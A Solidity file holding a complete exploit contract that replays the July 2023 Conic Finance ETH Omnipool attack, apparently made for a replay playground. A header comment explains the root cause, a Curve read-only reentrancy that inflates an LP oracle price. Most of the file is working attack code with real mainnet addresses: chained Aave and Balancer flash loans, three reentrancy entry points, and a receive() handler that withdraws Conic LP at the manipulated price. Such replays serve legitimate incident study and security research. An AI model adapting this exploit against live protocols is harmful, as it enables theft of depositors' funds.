// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2023-07-Conic).
// Faithful, no-import copy of `ContractTest` from
// evm-hack-registry/2023-07-Conic_exp/test/Conic_exp.sol, with
// `testExploit()` renamed to `run()` (the recorded entrypoint) and Foundry's
// `Test`/`vm.label`/`emit log_named_decimal_uint` dependencies stripped (not
// needed to replay the attack — only used in the original to print progress
// logs / label addresses in the trace). Everything else — the nested Aave
// V2 -> Aave V3 -> Balancer flash loans, the 7-iteration Conic deposit/swap
// loop, the three `nonce`-gated reentrancy windows (`reenter_1/2/3`) into
// three different Curve pools' `remove_liquidity`, the `receive()` state
// machine that calls `handleDepeggedCurvePool()` / `withdraw()` mid-
// reentrancy, and the final unwind — is copied verbatim.
//
// Root cause (Conic Finance ETH Omnipool, July 2023 — Curve read-only
// reentrancy inflates a balance-based Curve-LP oracle price, letting the
// attacker over-redeem Conic LP shares):
//
// Conic's ETH Omnipool spreads WETH deposits across three Curve pools
// (Lido stETH/ETH, rETH/ETH, cbETH/ETH) and mints `cncETH` shares against
// the pool's total underlying value. That total is priced through
// `GenericOracleV2` -> `CurveLPOracleV2`, which values each Curve LP token
// as (sum of pool coin balances x spot price) / LP totalSupply, read
// straight out of the Curve pool's live storage.
//
// Curve pools that pay out native ETH on `remove_liquidity` do so via a raw
// external call BEFORE the pool finishes updating `balances`/`totalSupply`
// -- the classic read-only-reentrancy window. The attacker:
//   1. Nested flash loans: Aave V2 (20,000 stETH) -> Aave V3 (850 cbETH) ->
//      Balancer (20,550 rETH + 3,000 cbETH + 28,504.2 WETH) for working
//      capital, each triggering its own callback.
//   2. Inside the Balancer callback (`receiveFlashLoan`), loops 7 times
//      depositing 1,214 WETH into ConicEthPool and swapping cbETH/rETH into
//      WETH via their Curve pools -- minting ~8,478 cncETH.
//   3. Calls `reenter_1()`: adds liquidity to LidoCurvePool (mint steCRV),
//      then calls `remove_liquidity()`. Curve sends native ETH out via a
//      raw call BEFORE its internal state settles -> `receive()` fires with
//      `nonce == 1` -> calls `ConicEthPool.handleDepeggedCurvePool
//      (LidoCurvePool)`, which reads the same manipulable oracle to mark the
//      pool "depegged" while its balances/totalSupply are mid-update.
//   4. Calls `reenter_2()`: same pattern against `cbETH_ETH_Pool` ->
//      `receive()` fires with `nonce == 2` -> another
//      `handleDepeggedCurvePool(cbETH_ETH_Pool)` call mid-reentrancy.
//   5. Calls `reenter_3()`: same pattern against `rETH_ETH_Pool` ->
//      `receive()` fires with `nonce == 3` -> instead of calling
//      `handleDepeggedCurvePool`, calls `ConicEthPool.withdraw(6292 ether,
//      0)` -- redeeming Conic LP AT THE MANIPULATED PRICE, mid-reentrancy,
//      for outsized WETH. The rETH/ETH pool's LP price spikes from
//      ~3,921 USD to ~13,263 USD (+238%) because its WETH side is already
//      drained by the in-progress `remove_liquidity` while its rETH side
//      (priced via Chainlink) and totalSupply are still mid-collapse.
//   6. Repays all three flash loans innermost-to-outermost, then
//      `sellAllTokenToWETH()` converts every remaining token to WETH,
//      netting ~1,724.21 WETH (~$3.25M) of profit.

interface IWFTM {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function deposit() external payable;
    function withdraw(uint256 wad) external;
    function decimals() external view returns (uint8);
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function decimals() external view returns (uint8);
}

interface IConicEthPool {
    function handleDepeggedCurvePool(address) external;

    function deposit(uint256 underlyingAmount, uint256 minLpReceived, bool stake) external returns (uint256);

    function withdraw(uint256 conicLpAmount, uint256 minUnderlyingReceived) external returns (uint256);
}

interface IGenericOracleV2 {
    function getUSDPrice(address) external returns (uint256);
}

interface ICurve {
    function exchange(uint256 i, uint256 j, uint256 dx, uint256 min_dy) external payable returns (uint256);

    function add_liquidity(uint256[2] memory amounts, uint256 min_mint_amount) external payable returns (uint256);

    function remove_liquidity(
        uint256 token_amount,
        uint256[2] memory min_amounts,
        bool use_eth,
        address receiver
    ) external;
}

interface ICurvePool {
    function exchange(int128 i, int128 j, uint256 dx, uint256 min_dy) external payable returns (uint256);

    function add_liquidity(uint256[2] memory amounts, uint256 min_mint_amount) external payable returns (uint256);

    function remove_liquidity(uint256 amount, uint256[2] memory min_amounts) external;
}

interface IBalancerVault {
    function flashLoan(
        address recipient,
        address[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;
}

interface IAaveFlashloan {
    function flashLoan(
        address receiverAddress,
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata modes,
        address onBehalfOf,
        bytes calldata params,
        uint16 referralCode
    ) external;

    function flashLoanSimple(
        address receiverAddress,
        address asset,
        uint256 amount,
        bytes calldata params,
        uint16 referralCode
    ) external;
}

contract ConicExploit {
    IWFTM WETH = IWFTM(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));
    IERC20 rETH = IERC20(0xae78736Cd615f374D3085123A210448E74Fc6393);
    IERC20 stETH = IERC20(0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84);
    IERC20 cbETH = IERC20(0xBe9895146f7AF43049ca1c1AE358B0541Ea49704);
    IERC20 steCRV = IERC20(0x06325440D014e39736583c165C2963BA99fAf14E);
    IERC20 cbETH_ETH_LP = IERC20(0x5b6C539b224014A09B3388e51CaAA8e354c959C8);
    IERC20 rETH_ETH_LP = IERC20(0x6c38cE8984a890F5e46e6dF6117C26b3F1EcfC9C);
    IERC20 cncETH = IERC20(0x3565A68666FD3A6361F06f84637E805b727b4A47);
    ICurve rETH_ETH_Pool = ICurve(0x0f3159811670c117c372428D4E69AC32325e4D0F);
    ICurve cbETH_ETH_Pool = ICurve(0x5FAE7E604FC3e24fd43A72867ceBaC94c65b404A);
    IBalancerVault Balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IAaveFlashloan aaveV2 = IAaveFlashloan(0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9);
    IAaveFlashloan aaveV3 = IAaveFlashloan(0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2);
    ICurvePool LidoCurvePool = ICurvePool(0xDC24316b9AE028F1497c275EB9192a3Ea0f67022);
    IConicEthPool ConicEthPool = IConicEthPool(0xBb787d6243a8D450659E09ea6fD82F1C859691e9);
    IGenericOracleV2 Oracle = IGenericOracleV2(0x286eF89cD2DA6728FD2cb3e1d1c5766Bcea344b0);
    uint256 nonce;

    function run() external {
        WETH.approve(address(rETH_ETH_Pool), type(uint256).max);
        WETH.approve(address(LidoCurvePool), type(uint256).max);
        WETH.approve(address(cbETH_ETH_Pool), type(uint256).max);
        WETH.approve(address(ConicEthPool), type(uint256).max);
        stETH.approve(address(LidoCurvePool), type(uint256).max);
        rETH.approve(address(rETH_ETH_Pool), type(uint256).max);
        cbETH.approve(address(cbETH_ETH_Pool), type(uint256).max);

        aaveV2Flashloan();

        sellAllTokenToWETH();
    }

    function aaveV2Flashloan() internal {
        address[] memory assets = new address[](1);
        assets[0] = address(stETH);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 20_000 ether;
        uint256[] memory modes = new uint256[](1);
        modes[0] = 0;
        aaveV2.flashLoan(address(this), assets, amounts, modes, address(this), "", 0);
    }

    // Aave V2 flashLoan callback
    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata params
    ) external returns (bool) {
        aaveV3.flashLoanSimple(address(this), address(cbETH), 850 ether, new bytes(0), 0);
        IERC20(assets[0]).approve(address(aaveV2), amounts[0] + premiums[0]);
        return true;
    }

    // Aave V3 flashLoan callback
    function executeOperation(
        address asset,
        uint256 amount,
        uint256 premium,
        address initator,
        bytes calldata params
    ) external payable returns (bool) {
        balancerFlashloan();
        IERC20(asset).approve(address(aaveV3), premium + amount);
        return true;
    }

    function balancerFlashloan() internal {
        address[] memory tokens = new address[](3);
        tokens[0] = address(rETH);
        tokens[1] = address(cbETH);
        tokens[2] = address(WETH);
        uint256[] memory amounts = new uint256[](3);
        amounts[0] = 20_550 ether;
        amounts[1] = 3000 ether;
        amounts[2] = 28_504.2 ether;
        bytes memory userData = "";
        Balancer.flashLoan(address(this), tokens, amounts, userData);
    }

    // Balancer Vault flashLoan callback
    function receiveFlashLoan(
        address[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external {
        // repeatedly deposit WETH to ConicEthPool and swap cbETH,rETH to WETH
        for (uint256 i; i < 7; ++i) {
            ConicEthPool.deposit(1214 ether, 0, false);
            cbETH_ETH_Pool.exchange(1, 0, 121 ether, 0);
            rETH_ETH_Pool.exchange(1, 0, 121 ether, 0);
        }

        reenter_1();

        Oracle.getUSDPrice(address(cbETH_ETH_LP));
        reenter_2();

        Oracle.getUSDPrice(address(rETH_ETH_LP));
        reenter_3();

        // repay flashLoan
        rETH_ETH_Pool.exchange(0, 1, 3450 ether, 0); // swap WETH to rETH
        cbETH_ETH_Pool.exchange(0, 1, 850 ether, 0); // swap WETH to cbETH
        ConicEthPool.withdraw(cncETH.balanceOf(address(this)), 0);
        WETH.deposit{value: address(this).balance}();
        rETH_ETH_Pool.exchange(0, 1, 1100 ether, 0); // swap WETH to rETH
        WETH.withdraw(300 ether);
        LidoCurvePool.exchange{value: 300 ether}(0, 1, 300 ether, 0); // swap WETH to stETH

        IERC20(tokens[0]).transfer(msg.sender, amounts[0] + feeAmounts[0]);
        IERC20(tokens[1]).transfer(msg.sender, amounts[1] + feeAmounts[1]);
        IERC20(tokens[2]).transfer(msg.sender, amounts[2] + feeAmounts[2]);
    }

    function reenter_1() internal {
        WETH.withdraw(20_000 ether);
        uint256[2] memory amount;
        amount[0] = 20_000 ether;
        amount[1] = stETH.balanceOf(address(this));
        LidoCurvePool.add_liquidity{value: 20_000 ether}(amount, 0); // mint steCRV
        amount[0] = 0;
        amount[1] = 0;
        Oracle.getUSDPrice(address(steCRV));
        nonce++;
        LidoCurvePool.remove_liquidity(steCRV.balanceOf(address(this)), amount); // burn steCRV, first reentrancy enter point
    }

    function reenter_2() internal {
        uint256[2] memory amount;
        WETH.withdraw(WETH.balanceOf(address(this)) - 4 ether);
        cbETH_ETH_Pool.exchange(1, 0, cbETH.balanceOf(address(this)), 0); // swap cbETH to WETH
        amount[0] = 1.8 ether;
        amount[1] = 0;
        cbETH_ETH_Pool.add_liquidity(amount, 0); // mint cbETH/ETH-f
        amount[0] = 0;

        nonce++;
        cbETH_ETH_Pool.remove_liquidity(cbETH_ETH_LP.balanceOf(address(this)), amount, true, address(this)); // burn cbETH/ETH-f, second reentrancy enter point
    }

    function reenter_3() internal {
        cbETH_ETH_Pool.exchange(0, 1, WETH.balanceOf(address(this)), 0); // swap WETH to cbETH
        rETH_ETH_Pool.exchange(1, 0, rETH.balanceOf(address(this)), 0); // swap rETH to WETH
        uint256[2] memory amount;
        amount[0] = 2.4 ether;
        amount[1] = 0;
        rETH_ETH_Pool.add_liquidity(amount, 0); // mint rETH/ETH-f
        amount[0] = 0;

        nonce++;
        rETH_ETH_Pool.remove_liquidity(rETH_ETH_LP.balanceOf(address(this)), amount, true, address(this)); // burn rETH/ETH-f, third reentrancy enter point
    }

    receive() external payable {
        if (msg.sender != address(WETH)) {
            if (nonce == 1) {
                Oracle.getUSDPrice(address(steCRV));
                ConicEthPool.handleDepeggedCurvePool(address(LidoCurvePool)); // set LidoCurvePool as depegged pool
            } else if (nonce == 2) {
                Oracle.getUSDPrice(address(cbETH_ETH_LP));
                ConicEthPool.handleDepeggedCurvePool(address(cbETH_ETH_Pool)); // set cbETH_ETH_Pool as depegged pool
            } else if (nonce == 3) {
                Oracle.getUSDPrice(address(rETH_ETH_LP));
                ConicEthPool.withdraw(6292 ether, 0); // withdraw assets from ConicEthPool
                nonce++;
            }
        }
    }

    function sellAllTokenToWETH() internal {
        cbETH_ETH_Pool.exchange(1, 0, cbETH.balanceOf(address(this)), 0);
        rETH_ETH_Pool.exchange(1, 0, rETH.balanceOf(address(this)), 0);
        LidoCurvePool.exchange(1, 0, stETH.balanceOf(address(this)), 0);
        WETH.deposit{value: address(this).balance}();
    }
}
